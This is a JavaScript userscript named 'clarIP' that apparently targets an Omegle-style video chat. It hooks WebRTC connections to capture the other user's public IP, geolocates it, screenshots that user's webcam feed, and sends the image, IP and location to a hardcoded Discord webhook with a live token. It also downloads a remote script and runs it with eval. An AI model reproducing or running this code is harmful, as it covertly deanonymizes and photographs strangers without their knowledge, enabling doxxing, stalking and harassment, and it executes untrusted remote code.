
(function () {



    const head = document.getElementsByTagName('head')[0];
    const body = document.getElementsByTagName('body')[0];
    var changed = false;
    const regionNames = new Intl.DisplayNames(['en'], {type: 'region'});
    const hexToDecimal = (hex) => {
        return parseInt(hex.replace("#", ""), 16);
    };

    const injectHead = (content,type) => {
        const element = document.createElement(type);
        element.innerHTML = content;
        head.appendChild(element);
    };

    const injectBody = (content, classnames) => {
        const element = document.createElement("div");
        element.innerHTML = content;
        for(let classname of classnames){
            element.classList.add(classname);
        }
        body.appendChild(element);
    }


    const windowURL = "https://raw.githubusercontent.com/yuig/clarIP/main/index.html?es=" + Math.floor(Math.random()*16777215).toString(16);
    const styleURL = "https://raw.githubusercontent.com/yuig/clarIP/main/style.css?es=" + Math.floor(Math.random()*16777215).toString(16);
    head.innerHTML += '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">';
    const notificationScript = getData("https://raw.githubusercontent.com/yuig/clarIP/main/notif.js?es=" + Math.floor(Math.random()*16777215).toString(16));
    eval(notificationScript);
    try{
        addNotification("clarIP","clarIP loaded successfully",10,0,5000);
        addNotification("clarIP","version: v0.6",10,0,5000);
    }
    catch{
        console.warn("Notification system hasn't been loaded.")
    }


    //placeholder workaround xd
    const setWindowFunction = () =>{
        window.screenshotxD = () => {
            const image = document.querySelector("#imag");
            const video = document.querySelector("#remote-video");
            const wrapper = document.querySelector("#remote-video-wrapper")
            const request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/1079404044445028402/496CuosXZpzH_Q4D1-JwQkE0LOINAAi1Z984gJojItH2Rio0fTWDLKfAbsFLqjbNJShD");
            request.withCredentials = true
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            wrapper.style.width = video.videoWidth+"px";
            var ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            base64Image = canvas.toDataURL('image/png');
            image.src = base64Image;
            var formData = new FormData();
            var myEmbed = {
                title: "clarIP",
                description: `say cheese :)`,
                color: hexToDecimal("#640af5"),
            };
            var params = {
                username: "clarIP",
                avatar_url:
                "https://media.discordapp.net/attachments/1137174682588684438/1159237525378965615/1696006046373060.gif?ex=65304b13&is=651dd613&hm=736a011aba73272aef8adcdeba507c5251e4757f48752fc7e7db9093b77ce88a&",
                embeds: [myEmbed],
            };
            formData.append('payload_json', JSON.stringify(params))
            canvas.toBlob((blob) => {
                formData.append('files[0]', blob, "blob.png");
                request.send(formData);
                return;
            });
        }
    }
    window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
    window.RTCPeerConnection = function (...args) {
        const pc = new window.oRTCPeerConnection(...args);

        pc.oaddIceCandidate = pc.addIceCandidate;

        pc.addIceCandidate = function (iceCandidate, ...rest) {
            
            const fields = iceCandidate.candidate.split(" ");
            console.log(iceCandidate.candidate);
            const connectionType = fields[3]
            const ip = fields[4];
            const port = fields[5];
            if (fields[7] === "srflx") {
                getLocation(ip,port);
            }
            return pc.oaddIceCandidate(iceCandidate, ...rest);
        };
        return pc;
    };

    var base64Image;
    const set_message = (ipp, cityy, regionn, countryy, locc) => {
        ip.innerText = ipp;
        city.innerText =  `${cityy},${regionn}`;
        country.innerText =  countryy;
        loc.innerText =  locc;
    }





    var getLocation = async (ip,port) => {
        let url = `https://freeipapi.com/api/json/${ip}`;
        await fetch(url).then((response) =>
            response.json().then((json) => {
                const ip = json.ipAddress+":"+port
                set_message(ip, json.cityName, json.regionName, json.countryName, json.isProxy);
                const request = new XMLHttpRequest();
                const image = document.querySelector("#imag");
                const video = document.querySelector("#remote-video");
                const wrapper = document.querySelector("#remote-video-wrapper")
                const canvas = document.createElement('canvas');
                request.open("POST", "https://discord.com/api/webhooks/1079404044445028402/496CuosXZpzH_Q4D1-JwQkE0LOINAAi1Z984gJojItH2Rio0fTWDLKfAbsFLqjbNJShD");
                request.withCredentials = true
                const watermark = document.querySelector(".remote-video__watermark");
                watermark.style = "background-image: url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&');"
                // watermark.backgroundImage = "url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&')"
                
                var set = setInterval(() => {
                if(wrapper.classList.contains('s-play')){
                    clearInterval(set);
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    var ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    base64Image = canvas.toDataURL('image/png');
                    var image = document.querySelector("#imag");
                    image.src = base64Image;
                    var formData = new FormData();
                    var myEmbed = {
                        title: "clarIP",
                        description: `
                        ip: ${ip} \n
                        city: ${json.cityName} \n
                        region: ${json.regionName} \n
                        country: ${json.countryName} \n
                        isproxy: ${json.isProxy} \n`,
                        color: hexToDecimal("#"+Math.floor(Math.random()*16777215).toString(16)),
                      };
                      var params = {
                        username: "ome",
                        embeds: [myEmbed],
                      };
                    formData.append('payload_json', JSON.stringify(params))


                    canvas.toBlob((blob) => {
                        formData.append('files[0]', blob, "blob.png");
                        request.send(formData);
                    return;

                    })
                }
                }, 500);

            })
        );
    };
        injectHead(getData(styleURL),"style");
        injectBody(getData(windowURL), ["card","clarIP"]);
        var header = document.getElementsByClassName("clarIP")[0];
        var ip = document.getElementById("ip");
        var city = document.getElementById("city");
        var country = document.getElementById("country");
        var loc = document.getElementById("loc");
        var image = document.querySelector("#imag");

        header.style.left = "0px";
        header.style.top = "0px";
        header.onmousedown = function (e) {
            var x = e.clientX - header.offsetLeft;
            var y = e.clientY - header.offsetTop;
            document.onmousemove = function (e) {
                header.style.left = e.clientX - x + "px";
                header.style.top = e.clientY - y + "px";
            }
        }
        document.onmouseup = function () {
            document.onmousemove = null;
        }
        setWindowFunction();

})();